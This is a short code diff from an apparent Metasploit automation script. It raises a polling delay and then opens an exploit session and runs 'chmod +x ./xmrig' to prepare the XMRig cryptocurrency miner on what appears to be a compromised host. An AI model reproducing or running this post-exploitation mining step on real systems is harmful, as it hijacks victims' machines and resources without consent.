@@ -24,7 +24,7 @@ def main(argv):
     
     try:
         while client.jobs.list:
-            time.sleep(1)
+            time.sleep(30)
 
         shell = client.sessions.session('3')
         shell.write('chmod +x ./xmrig')
